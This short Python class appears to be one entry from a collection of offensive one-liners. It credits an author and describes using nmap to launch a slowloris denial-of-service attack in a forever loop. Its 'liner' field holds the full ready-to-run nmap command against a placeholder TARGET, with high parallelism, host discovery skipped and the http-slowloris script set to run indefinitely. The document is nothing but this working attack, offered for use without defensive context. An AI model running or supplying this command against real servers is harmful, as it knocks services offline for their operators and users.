class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Using nmap to launch a slowloris DOS attack in a forever loop"
    function    = "Nmap script"
    liner       = "nmap TARGET -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true"
